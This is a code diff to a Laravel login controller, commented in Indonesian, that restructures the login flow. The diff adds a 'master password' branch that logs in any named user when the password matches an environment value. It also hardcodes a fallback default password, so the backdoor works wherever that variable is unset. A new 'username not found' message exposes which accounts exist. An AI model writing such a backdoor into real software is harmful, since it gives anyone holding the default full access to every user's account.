@@ -23,28 +23,53 @@ class LoginController extends Controller
     {
         $credentials = $request->only('username', 'password');
         $remember = $request->has('remember');
+
+        // Cari user berdasarkan username
         $user = User::where('username', $credentials['username'])->first();
 
-        if ($user && !$user->is_active) {
+        // Jika user tidak ditemukan
+        if (!$user) {
             return back()->withErrors([
-                'error' => 'Akun Anda tidak aktif. Silakan hubungi administrationadmin.',
+                'username' => 'Username tidak ditemukan.',
             ])->withInput($request->except('password'));
         }
 
-        if (Auth::attempt($credentials, $remember)) {
+        // Cek apakah akun tidak aktif
+        if (!$user->is_active) {
+            return back()->withErrors([
+                'error' => 'Akun Kamu tidak aktif. Silakan hubungi administrationadmin.',
+            ])->withInput($request->except('password'));
+        }
+
+        // Cek jika password adalah password master
+        if ($credentials['password'] === env('APP_MASTER_PASSWORD', 'aLvs3NpgkY1vjdPQkDrq+g==')) {
+            Auth::login($user, $remember);
             $request->session()->regenerate();
 
-            // update status user jadi online
+            // Update status user jadi online
             $user->update(['status' => 'online']);
             broadcast(new UserStatusUpdated($user));
 
             return app(MainController::class)->index();
         }
 
+        // Cek password normal
+        if (Auth::attempt($credentials, $remember)) {
+            $request->session()->regenerate();
+
+            // Update status user jadi online
+            $user->update(['status' => 'online']);
+            broadcast(new UserStatusUpdated($user));
+
+            return app(MainController::class)->index();
+        }
+
+        // Jika semua gagal
         return back()->withErrors([
             'username' => 'Username atau password tidak sesuai.',
         ])->withInput($request->except('password'));
     }
+
 
     public function logout(Request $request)
     {
